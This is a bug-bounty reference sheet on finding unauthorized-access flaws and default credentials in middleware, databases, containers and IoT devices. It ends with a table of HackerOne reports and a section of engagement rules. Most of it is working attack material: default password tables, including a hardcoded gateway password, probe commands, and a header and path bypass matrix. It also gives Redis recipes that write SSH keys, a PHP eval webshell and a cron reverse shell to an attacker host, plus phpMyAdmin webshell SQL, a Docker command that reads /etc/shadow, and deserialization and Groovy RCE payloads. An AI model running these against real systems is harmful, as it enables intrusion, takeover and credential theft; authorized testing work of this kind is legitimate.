# Unauthorized Access / Default Credentials

> Perspective: black-box, assume only the URL is known, no source code
> Of the 88,636 vulnerabilities in the WooYun database, **14,377 (16.2%)** are unauthorized access — the easiest hand for a hunter to win with

## 1. One-line Summary

Unauthorized access = "the service should have authentication but doesn't" or "the authentication can be bypassed".
SRC focus: **shallowest entry point, heaviest impact** — a single IP scan + one curl gets data/RCE.

---

## 2. High-frequency Entry Points (statistics + ports)

### 2.1 Middleware Management Panels

| Service | Default port | Default path | Default credentials |
|------|---------|---------|---------|
| Tomcat | 8080 | `/manager/html`, `/host-manager/html` | `tomcat/tomcat`, `admin/admin` |
| WebLogic | 7001 | `/console/`, `/wls-wsat/` | `weblogic/weblogic`, `weblogic/weblogic1`, `weblogic/12345678`, `system/password` |
| JBoss | 8080 | `/jmx-console/`, `/web-console/`, `/invoker/JMXInvokerServlet` | `admin/admin` |
| Resin | 8080 | `/resin-admin/` | - |
| Spring Boot Actuator | 8080 | `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`, `/actuator/health` | usually none |
| Jenkins | 8080 | `/script`, `/manage` | mostly none / `admin/admin` |
| Zabbix | 80/8080 | `/zabbix/` | `Admin/zabbix` |
| Grafana | 3000 | `/login` | `admin/admin` |
| Kibana | 5601 | `/` | usually none |
| phpMyAdmin | 80 | `/phpmyadmin/`, `/pma/`, `/myadmin/` | `root/`, `root/root` |

### 2.2 Database / Cache Services

| Service | Port | Verification command | Impact |
|------|------|---------|------|
| Redis | 6379 | `redis-cli -h IP info` | Write SSH public key / Webshell / cron job → RCE |
| MongoDB | 27017 | `mongo IP:27017 --eval "db.version()"` | Full data export |
| Memcached | 11211 | `echo "stats" \| nc IP 11211` | Data + DDoS reflection |
| Elasticsearch | 9200 | `curl IP:9200/_cat/indices` | Full index data + Groovy RCE (old versions) |
| MySQL | 3306 | `mysql -h IP -u root` | Weak password / empty password |
| ZooKeeper | 2181 | `echo stat \| nc IP 2181` | Config leak |
| Etcd | 2379 | `curl IP:2379/v2/keys/?recursive=true` | Config + token |
| Docker Remote API | 2375 | `curl IP:2375/info` | Container escape → host RCE |
| Kubelet | 10250/10255 | `curl -k https://IP:10250/pods` | Cluster takeover |
| rsync | 873 | `rsync IP::` | Entire site source code |
| FTP | 21 | `ftp IP` then `anonymous` | Anonymous access |
| Hadoop YARN | 8088 | `/cluster` | Submit job → RCE |

### 2.3 API / Documentation Exposure

```
/swagger-ui.html           /swagger-ui/
/swagger/index.html        /v2/api-docs
/api-docs                  /openapi.json
/api/v1/admin_is_login     /api/configs
/api/debug                 /actuator/env
/.env                      /metrics (Prometheus)
```

### 2.4 IoT / Camera Default Credentials

| Device | Default account/password |
|------|------------|
| Generic camera | admin/admin, admin/12345, admin/123456, root/admin |
| Hikvision | admin/12345 |
| Dahua | admin/admin |
| Router | admin/admin, admin/password |
| Telecom home gateway | telecomadmin/nE7jA%5m (hardcoded, cannot be changed) |

---

## 3. Probing Techniques

### 3.1 Service-level Fingerprint (one-line command)

```bash
nmap -sV -p 21,80,443,873,2181,2375,2379,3000,3306,5601,6379,7001,8080,8088,8443,9200,10250,11211,27017 target

# Or targeting a single site
shodan host IP
fofa "ip=\"target\""
```

### 3.2 Single-service One-shot Probe

```bash
# Redis unauthorized
redis-cli -h target ping        # returns PONG → unauthorized
redis-cli -h target info        # pull info

# Mongo
mongo target:27017 --eval "db.adminCommand('listDatabases')"
mongoexport -h target -d <db> -c <coll> -o out.json

# ES
curl -s http://target:9200/_cat/indices?v
curl -s "http://target:9200/_search?pretty&size=10"

# Docker
curl -s http://target:2375/containers/json
curl -s http://target:2375/info

# rsync
rsync target::
rsync -avz target::module ./local/

# Memcached
echo -e "stats\nquit" | nc target 11211

# ZooKeeper
echo stat | nc target 2181

# Spring Actuator
for p in env heapdump mappings beans configprops trace logfile; do
  curl -s -o /dev/null -w "%{http_code} $p\n" http://target/actuator/$p
done
```

### 3.3 Backend / Web Management Panel

```bash
# Bundled wordlist
ffuf -u http://target/FUZZ -w admin-paths.txt -mc 200,302,401

# Key paths (high-hit table based on WooYun cases)
admin/   admin.php   admin/index.php   admin/login.aspx
manage/  manage.php  manager/html      console/
jmx-console/   web-console/
phpmyadmin/    pma/   myadmin/
console/login/LoginForm.jsp
swagger-ui.html   swagger/   api-docs
actuator/   actuator/env
debug/      test/   dev/
```

### 3.4 Default Credential Enumeration (rate-limited!)

```bash
# Hydra (mind the rate, otherwise it's a violation)
hydra -L users.txt -P pass.txt -t 4 -W 2 target http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# Limit: generally cap at 50 attempts/hour, do not brute-force blindly
```

---

## 4. Bypass Matrix (after reaching the login page)

| Protection | Bypass |
|------|------|
| IP allowlist | `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `X-Client-IP`, `X-Remote-IP`, `X-Remote-Addr`, `Client-IP`, `Forwarded: for=127.0.0.1` |
| Host allowlist | `Host: localhost`, `Host: 127.0.0.1`, double Host header |
| Path authorization | `/admin` blocked → `/admin/`, `/admin/.`, `//admin`, `/admin;param`, `/Admin`, `%2fadmin`, `/api/../admin` |
| Method restriction | GET blocked → try POST / OPTIONS / `X-HTTP-Method-Override: GET` |
| Referer validation | Add `Referer: https://target/admin` |
| CAPTCHA brute-force | CAPTCHA doesn't refresh → brute-force password with a fixed CAPTCHA |
| Universal password | `' or '1'='1`, `admin'--`, `admin'#`, `admin"#` |
| Front-end authentication | Disable JS, remove front-end redirect code, directly access the target page URL |
| Encrypted cookie | Check for a "unified encryption key" issue (same CMS using a universal key network-wide) |

Reference WooYun cases:
- Ganqi site-building system `lstate=515csmxSi1aTO9ysxvJ1Gpmnj7hHuPxjMdfZdEP49lJZ` (unified key)
- 58.com Tomcat `admin:admin123456`
- Base64 path `/ZmptY2NtYW5hZ2Vy/` (decodes → management path)

---

## 5. Exploitation / Privilege Escalation / Lateral Movement

### 5.1 Redis Unauthorized → RCE Three Techniques

```bash
# 1. Write SSH public key
redis-cli -h target
> config set dir /root/.ssh/
> config set dbfilename authorized_keys
> set x "\n\nssh-rsa AAAA...your public key...\n\n"
> save

# 2. Write Webshell (need to know the web root + write permission)
> config set dir /var/www/html/
> config set dbfilename shell.php
> set x "<?php @eval($_POST['c']);?>"
> save

# 3. Cron job reverse shell (CentOS)
> config set dir /var/spool/cron/
> config set dbfilename root
> set x "\n\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
> save
```

### 5.2 Tomcat / WebLogic / JBoss → Deploy WAR

```
1. Log into the management panel with default credentials
2. Upload webshell.war / use the deploy interface
3. Access /shell/cmd.jsp to trigger
```

### 5.3 Spring Actuator heapdump → Database Password

```bash
curl http://target/actuator/heapdump -o heap.bin
# Analyze with Eclipse MAT / vsheap, search for datasource, password, jdbc
strings heap.bin | grep -iE "(password|jdbc|secret|key)" | sort -u
```

### 5.4 phpMyAdmin → Webshell

```sql
-- Write a file (requires FILE permission + empty secure_file_priv)
SELECT '<?php @eval($_POST[c]);?>' INTO OUTFILE '/var/www/html/x.php';
```

### 5.5 IDOR / ID Enumeration → Large-scale Data

```python
import requests
for i in range(1, 100000):
    r = requests.get(f"http://target/api/user/{i}", timeout=3)
    if r.status_code == 200:
        # 10 samples are enough to prove it, do not dump the database
        print(i, r.text[:100])
        if i > 10:
            break
```

---

## 6. Real-case Fingerprints (CVE / wooyun)

| Vulnerability | Fingerprint (black-box) | Probe |
|------|-------------|------|
| **wooyun-2015-0108547 monitoring device** | Directly access `/admin/index.jsp` to enter the backend | `curl http://target/admin/index.jsp` to see if it returns the management interface |
| **WebLogic CVE-2017-10271** | `/wls-wsat/CoordinatorPortType` returns a SOAP fault | XMLDecoder gadget POST → RCE |
| **WebLogic CVE-2019-2725** | `/_async/AsyncResponseService` reachable | same as above |
| **JBoss JMXInvokerServlet** | `/invoker/JMXInvokerServlet` 200 + `application/x-java-serialized-object` | ysoserial deserialization |
| **WebLogic T3 deserialization** | Port 7001 shows t3 in nmap | `java -jar ysoserial.jar CommonsCollections1 "id" \| nc target 7001` |
| **ES Groovy RCE (CVE-2014-3120)** | ES 1.x, `/_search` supports `script_fields` | `{"script_fields":{"x":{"script":"java.lang.Runtime.getRuntime().exec(\"id\")"}}}` |
| **Spring Boot Heapdump leak** | `/actuator/heapdump` 200 returns binary | `curl /actuator/heapdump -o heap.bin` |
| **Hadoop YARN REST API RCE** | `/ws/v1/cluster/apps/new-application` | POST to submit a job |
| **Docker Remote API** | 2375 open | `docker -H tcp://target:2375 run -v /:/host alpine cat /host/etc/shadow` |
| **Kubelet 10250 unauth** | `https://target:10250/pods` 200 | `kubectl --insecure-skip-tls-verify exec ...` |
| **CouchDB Fauxton** | 5984 + `/_utils/` | Create admin user |
| **RabbitMQ Management** | 15672 + `guest/guest` | Default account |

---

## 7. Reproduction / Evidence Essentials

### 7.1 Report HTTP Packet Template

```http
GET /actuator/env HTTP/1.1
Host: target.com
User-Agent: curl/8.0
Accept: */*

HTTP/1.1 200 OK
Content-Type: application/vnd.spring-boot.actuator.v3+json
Content-Length: 18743

{"activeProfiles":["prod"],"propertySources":[{"name":"applicationConfig: ...","properties":{"spring.datasource.password":{"value":"******"}, ...}}]}
```

Note: in the response, **replace strings of 4+ characters of sensitive data with `******`**, but preserve key names and structure.

### 7.2 CVSS Vector Reference

```
Unauthorized RCE            CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
Unauthorized data export    CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 High
Unauthorized admin backend  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1 Critical
Default-credential backend  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
```

### 7.3 Impact Section Wording

```
Through unauthorized access to the /actuator/heapdump endpoint, an attacker can download the complete
JVM heap dump file (about 200MB) without any credentials, which contains spring.datasource.password,
jwt.secret, redis.password and other critical credentials. With these credentials the attacker can:
1. Directly connect to the database and export all user data;
2. Forge JWT tokens for any user and gain administrator privileges;
3. Move laterally to Redis, MQ and other supporting components.

Sample proof (already redacted):
spring.datasource.url=jdbc:mysql://10.0.x.x:3306/****
spring.datasource.password=****1234
(full evidence in the attached heapdump-strings.txt)
```

---

## 8. What Not To Do

- **Forbidden**: using Redis/Mongo to write shells, leave a webshell, or set up cron. **Do read-only proofs only**: `info`, `ping`, `db.version()`, `listDatabases`. When you need to write a file to verify, use an obviously-PoC filename (`poc-2025-05-09.txt`) and clean it up immediately.
- **Forbidden**: dumping more than 10 user records from Mongo / ES. Taking 1–3 redacted records is enough.
- **Forbidden**: logging in with default credentials + using the functionality (creating users, deleting data). Only prove login is possible, then log out immediately.
- **Forbidden**: scanning network ranges larger than `/16`.
- **Forbidden**: uploading heapdumps or backup files to third-party cloud storage. Save locally and delete after reporting.
- **Rate limit**: path fuzzing at 1–5 rps, one machine, no concurrency.
- **When reporting**, redact: internal IPs, domains, usernames, phone numbers, emails, tokens.

## H1 Real Cases

_A total of 46 publicly disclosed HackerOne High/Critical reports match this category, sorted by (bounty + votes×100) and taking the Top 12_

| Severity | $ | Program | Title (click for original report) | Summary |
|---|--:|---|---|---|
| High | 15300 usd | PayPal | [Token leak in security challenge flow allows retrieving victim's PayPal email and plain text pass…](https://hackerone.com/reports/739737) | Token leak in security challenge flow allows retrieving victim's PayPal email and plain text password |
| Critical | — | Starbucks | [JumpCloud API Key leaked via Open Github Repository.](https://hackerone.com/reports/716292) | Summary:** Open Github Repo Leaking Starbucks JumbCloud API Key Description:** Team, While going through Github search I discov… |
| Critical | 12500 usd | LY Corporation | [Spring Actuator endpoints publicly available and broken authentication](https://hackerone.com/reports/838635) | Spring Actuator endpoints publicly available and broken authentication |
| High | 12500 usd | HackerOne | [Internal Access to Hackerone confluence Docs](https://hackerone.com/reports/3113398) | Internal Access to Hackerone confluence Docs |
| High | — | GitLab | [Ability To Delete User(s) Account Without User Interaction](https://hackerone.com/reports/928255) | Summary: Gitlab allows its user to exercise their GDPR rights (Right to Access/Delete) user data by sending an email to gdpr-re… |
| Critical | 5000 usd | LY Corporation | [Spring Actuator endpoints publicly available, leading to account takeover](https://hackerone.com/reports/862589) | Spring Actuator endpoints publicly available, leading to account takeover |
| High | — | LinkedIn | [Session Cookie Leakage via Static Header Field in WebViewerFragment](https://hackerone.com/reports/3475626) | Hello LinkedIn Security Team, I was able to identify a vulnerability in the `WebViewerFragment` that can lead to leaking the us… |
| Critical | 1000 usd | U.S. Dept Of Defense | [Wordpress Takeover using setup configuration at http://████.edu [HtUS]](https://hackerone.com/reports/1626205) | Description: The WordPress 'setup-config.php' installation page allows users to install WordPress in local or remote MySQL data… |
| High | — | Stripe | [Mass account takeover!](https://hackerone.com/reports/1634165) | Mass account takeover! |
| High | — | Equifax-vdp | [Important information leaked on Github](https://hackerone.com/reports/649322) | While searchin on Github about Equifax i found some juicy information like a username and password of this subdomain (https://t… |
| High | — | EXNESS | [Unrestricted Access to Celery Flower Instance](https://hackerone.com/reports/2264960) | Hi Team, The Celery Flower instance is running and publicly accessible via the PIM mobile route /pim/flower/* |

**Weakness distribution matching this category:**

- Misconfiguration: 18 entries
- Uncategorized → manually categorized: 16 entries
- Use of Hard-coded Credentials: 6 entries
- Missing Authentication for Critical Function: 2 entries
- Security Through Obscurity: 2 entries
- Use of Default Credentials: 1 entry
- Use of Hard-coded Password: 1 entry
